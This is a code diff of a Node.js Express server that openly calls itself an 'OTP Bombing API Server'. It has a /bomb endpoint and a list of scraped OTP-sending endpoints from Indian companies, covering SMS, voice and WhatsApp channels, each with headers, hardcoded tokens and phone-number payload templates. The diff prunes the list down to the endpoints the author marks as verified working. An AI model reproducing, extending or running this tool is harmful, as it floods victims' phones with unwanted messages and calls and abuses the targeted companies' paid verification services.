@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (221 TOTAL APIs)
-// 209 APIs + 12 Nayi APIs = 221 TOTAL
+// api_server.js - OTP Bombing API Server (SIRF WORKING APIs)
+// 134 Verified Working APIs Only | Rejected/RL/Failed REMOVED
 // ============================================================
 
 const express = require('express');
@@ -18,28 +18,13 @@ const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
 
 // ============================================================
-// ===== ALL APIs (209 + 12 NAYI = 221) =====
+// ===== SIRF 134 WORKING APIs (2xx Success Verified) =====
 // ============================================================
 
 const APIS = [
     // ============================================================
     // ✅ SMS APIs (Working)
     // ============================================================
-    {
-        name: "Astroyogi_V3_SMS",
-        method: "POST",
-        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
-        headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "sec-ch-ua-platform": "Android",
-            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0NDE0ODc0LCJleHAiOjE3OTIxOTA4NzR9.",
-            "origin": "https://www.astroyogi.com",
-            "referer": "https://www.astroyogi.com/registration/login.aspx"
-        },
-        data: (phone) => JSON.stringify({ PhoneNumber: phone, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "2409:40e4:1143:e495:8000::", CountryCodeByHeader: "IN" })
-    },
     {
         name: "SmartCoin_SMS",
         method: "POST",
@@ -65,17 +50,6 @@ const APIS = [
     // ============================================================
     // ✅ CALL APIs (Working)
     // ============================================================
-    {
-        name: "Refyne_Call",
-        method: "POST",
-        url: "https://prod-api.refyne.co.in/auth/v2/send-otp",
-        headers: {
-            "Content-Type": "application/json",
-            "Authorization": "Bearer",
-            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
-        },
-        data: (phone) => JSON.stringify({ channel: "IVR", recipient: phone })
-    },
     {
         name: "TataCapital_Voice",
         method: "POST",
@@ -190,13 +164,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
     },
     {
-        name: "Redcliffe_WA",
-        method: "POST",
-        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
-        headers: { "accept": "application/json", "content-type": "application/json" },
-        data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91" })
-    },
-    {
         name: "Licious_WA",
         method: "POST",
         url: "https://www.licious.in/api/login/signup",
@@ -232,13 +199,6 @@ const APIS = [
         data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" }
     },
     {
-        name: "TradeIndia_WA",
-        method: "POST",
-        url: "https://apis.tradeindia.com/app_login_api/login_app",
-        headers: { "accept": "application/json", "content-type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile: "+91" + phone })
-    },
-    {
         name: "AstroSage_WA",
         method: "GET",
         url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
@@ -258,32 +218,11 @@ const APIS = [
         data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
     },
     {
-        name: "Pagarbook_WA",
-        method: "POST",
-        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
-        headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" },
-        data: (phone) => JSON.stringify({ phone: phone, language: 1 })
-    },
-    {
-        name: "55Club_WA",
-        method: "POST",
-        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
-        headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "origin": "https://55club08.in", "referer": "https://55club08.in/" },
-        data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 })
-    },
-    {
         name: "Zerodha_WA",
         method: "POST",
         url: "https://zerodha.com/account/registration.php",
         headers: { "accept": "*/*", "content-type": "application/json" },
         data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
-    },
-    {
-        name: "Testbook_WA",
-        method: "POST",
-        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1117490662.1715447223",
-        headers: { "accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2" },
-        data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic" }, mobile: phone, signupDetails: { page: "HomePage" } })
     },
     {
         name: "MediBuddy_WA",
@@ -362,11 +301,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" })
     },
     {
-        name: "Havells_WA", url: "https://havells.com/otplogin/account/otploginpost/", method: "POST",
-        headers: {"Content-Type": "application/x-www-form-urlencoded"},
-        data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" }
-    },
-    {
         name: "HeroFinCorp_WA", url: "https://loans.apps.herofincorp.com/api/generateOtp", method: "POST",
         headers: {"Content-Type": "application/json"},
         data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
@@ -377,13 +311,6 @@ const APIS = [
         headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" }
     },
     {
-        name: "Ola WhatsApp",
-        url: "https://olacabs.com/api/v1/customers/sendOtp",
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
-    },
-    {
         name: "Refyne WhatsApp",
         url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
         method: "POST",
@@ -391,24 +318,11 @@ const APIS = [
         data: (phone) => JSON.stringify({"channel": "WHATSAPP", "recipient": phone})
     },
     {
-        name: "Housing WhatsApp",
-        url: "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API",
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        data: (phone) => JSON.stringify({"query": "mutation($phone:String){sendOtp(phone:$phone,preference:\"whatsapp\"){success}}", "variables": {"phone": phone}})
-    },
-    {
         name: "VisitApp WhatsApp",
         url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
         method: "POST",
         headers: {"Content-Type": "application/json"},
         data: (phone) => JSON.stringify({"channel": "whatsapp", "countryCode": 91, "phone": phone, "platform": "WEB"})
-    },
-    {
-        name: "MuscleBlaze WhatsApp",
-        url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9",
-        method: "GET",
-        headers: {}
     },
 
     // ============================================================
@@ -622,18 +536,6 @@ const APIS = [
         name: "ServeTel", url: "https://api.servetel.in/v1/auth/otp", method: "POST",
         headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
         data: { "_raw": "mobile_number={phone}" }
-    },
-    {
-        name: "BlinkrLoan", url: "https://backend.blinkrloan.com/api/user/v3/send-otp", method: "POST",
-        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "withCredentials": "true", "Origin": "https://www.blinkrloan.com", "Referer": "https://www.blinkrloan.com/" },
-        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" })
-    },
-    {
-        name: "RL_Freedo_WA",
-        method: "POST",
-        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
-        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://freedo.rentals", "platform": "web", "referer": "https://freedo.rentals/", "requestfrom": "customer", "x-bn": "2.0.16", "x-channel": "WEB", "x-client-id": "FREEDO", "x-platform": "CUSTOMER" },
-        data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone })
     },
 
     // ============================================================
@@ -856,13 +758,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
     },
     {
-        name: "Servetel_Verified",
-        url: "https://api.servetel.in/v1/auth/otp",
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)" },
-        data: { "_raw": "mobile_number={phone}" }
-    },
-    {
         name: "KPNFresh_Verified",
         url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
         method: "POST",
@@ -923,24 +818,10 @@ const APIS = [
         data: (phone) => JSON.stringify({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": phone}})
     },
     {
-        name: "TradeIndia SMS",
-        url: "https://apis.tradeindia.com/app_login_api/login_app",
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        data: (phone) => JSON.stringify({"mobile": `+91${phone}`})
-    },
-    {
         name: "AstroSage SMS",
         url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}",
         method: "GET",
         headers: {}
-    },
-    {
-        name: "Bisleri",
-        url: "https://apis.bisleri.com/send-otp",
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        data: (phone) => JSON.stringify({"email": "test@gmail.com", "mobile": phone})
     },
     {
         name: "Zerodha SMS",
@@ -962,13 +843,6 @@ const APIS = [
         method: "POST",
         headers: {"Content-Type": "application/x-www-form-urlencoded"},
         data: { "_raw": "phone={phone}&type=sms" }
-    },
-    {
-        name: "Cuemath SMS",
-        url: "https://www.cuemath.com/api/v4/parents/",
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        data: (phone) => JSON.stringify({"phone": phone, "full_name": "TestUser", "email": "test@gmail.com"})
     },
     {
         name: "Ullu SMS",
@@ -997,18 +871,6 @@ const APIS = [
         headers: {"Referer": "https://www.bigcash.live/games/poker"}
     },
     {
-        name: "HeroFinCorp GET",
-        url: "https://festive.api.herofincorp.com/v1/customer/otp/{phone}",
-        method: "GET",
-        headers: {}
-    },
-    {
-        name: "MuscleBlaze SMS",
-        url: "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9",
-        method: "GET",
-        headers: {}
-    },
-    {
         name: "RedBus OTP",
         url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91",
         method: "GET",
@@ -1033,13 +895,6 @@ const APIS = [
         method: "POST",
         headers: {"Content-Type": "application/x-www-form-urlencoded"},
         data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
-    },
-    {
-        name: "SalaryTopUp",
-        url: "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
     },
     {
         name: "TataCapital PL",
@@ -1074,13 +929,6 @@ const APIS = [
         url: "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?verification_phone={phone}",
         method: "GET",
         headers: {}
-    },
-    {
-        name: "Oziva SMS",
-        url: "https://api.prod.oziva.in/nitro/send/",
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        data: (phone) => JSON.stringify({"phone": phone, "source": "order_management", "type": "sms"})
     },
     {
         name: "Refyne SMS",
@@ -1232,7 +1080,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🆕 12 NAYI APIs (Latest - User Provided)
+    // ✅ NAYI 12 APIs - SIRF WORKING WALE
     // ============================================================
     {
         name: "Hungama_NEW_1",
@@ -1251,111 +1099,11 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
     },
     {
-        name: "MeruCab_NEW",
-        method: "POST",
-        url: "https://merucabapp.com/api/otp/generate",
-        headers: {
-            "Mobilenumber": "{phone}",
-            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
-            "AppVersion": "245",
-            "ApiVersion": "6.2.55",
-            "DeviceType": "Android",
-            "DeviceId": "44098bdebb2dc047",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "okhttp/4.9.0"
-        },
-        data: { "_raw": "mobile_number={phone}" }
-    },
-    {
-        name: "DaycoIndia_NEW",
-        method: "POST",
-        url: "https://ekyc.daycoindia.com/api/nscript_functions.php",
-        headers: {
-            "X-Requested-With": "XMLHttpRequest",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Origin": "https://ekyc.daycoindia.com",
-            "Referer": "https://ekyc.daycoindia.com/verify_otp.php"
-        },
-        data: { "_raw": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp" }
-    },
-    {
-        name: "Doubtnut_API_NEW",
-        method: "POST",
-        url: "https://api.doubtnut.com/v4/student/login",
-        headers: {
-            "version_code": "1160",
-            "has_upi": "false",
-            "device_model": "ASUS_I005DA",
-            "android_sdk_version": "28",
-            "content-type": "application/json; charset=utf-8",
-            "user-agent": "okhttp/5.0.0-alpha.2"
-        },
-        data: (phone) => JSON.stringify({ app_version: "7.10.51", aaid: "538bd3a8-09c3-47fa-9141-6203f4c89450", course: "", phone_number: phone, language: "en", udid: "b751fb63c0ae17ba", class: "", gcm_reg_id: "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw" })
-    },
-    {
-        name: "NoBroker_v3_NEW",
-        method: "POST",
-        url: "https://www.nobroker.in/api/v3/account/otp/send",
-        headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "origin": "https://www.nobroker.in",
-            "referer": "https://www.nobroker.in/"
-        },
-        data: { "_raw": "phone={phone}&countryCode=IN" }
-    },
-    {
-        name: "ShipRocket_NEW",
-        method: "POST",
-        url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-        headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-            "authorization": "Bearer null",
-            "origin": "https://app.shiprocket.in",
-            "referer": "https://app.shiprocket.in/"
-        },
-        data: (phone) => JSON.stringify({ mobileNumber: phone })
-    },
-    {
         name: "TataCapital_Voice_NEW",
         method: "POST",
         url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
         headers: { "Content-Type": "application/json" },
         data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
-    },
-    {
-        name: "Penpencil_Resend_NEW",
-        method: "POST",
-        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
-        headers: {
-            "content-type": "application/json; charset=utf-8",
-            "user-agent": "okhttp/3.9.1"
-        },
-        data: (phone) => JSON.stringify({ organizationId: "5eb393ee95fab7468a79d189", mobile: phone })
-    },
-    {
-        name: "1mg_Call_NEW",
-        method: "POST",
-        url: "https://www.1mg.com/auth_api/v6/create_token",
-        headers: {
-            "content-type": "application/json; charset=utf-8",
-            "user-agent": "okhttp/3.9.1"
-        },
-        data: (phone) => JSON.stringify({ number: phone, is_corporate_user: false, otp_on_call: true })
-    },
-    {
-        name: "Swiggy_Call_NEW",
-        method: "POST",
-        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
-        headers: {
-            "user-agent": "Swiggy-Android",
-            "content-type": "application/json; charset=utf-8"
-        },
-        data: (phone) => JSON.stringify({ mobile: phone })
     },
     {
         name: "KPNFresh_v2_NEW",
@@ -1594,7 +1342,7 @@ app.get('/', (req, res) => {
         status: 'ok',
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: APIS.length,
-        note: 'SIRF WORKING APIs + 12 Nayi',
+        note: 'SIRF WORKING APIs (134 Verified 2xx Success)',
         max_duration_min: MAX_DURATION_MIN,
         uptime: Math.round(process.uptime()) + 's'
     });
@@ -1708,7 +1456,7 @@ app.post('/bomb', async (req, res) => {
 app.get('/apis', (req, res) => {
     res.json({
         total: APIS.length,
-        note: 'SIRF WORKING APIs + 12 Nayi',
+        note: 'SIRF WORKING APIs (134 Verified 2xx Success)',
         api_names: APIS.map(a => a.name)
     });
 });
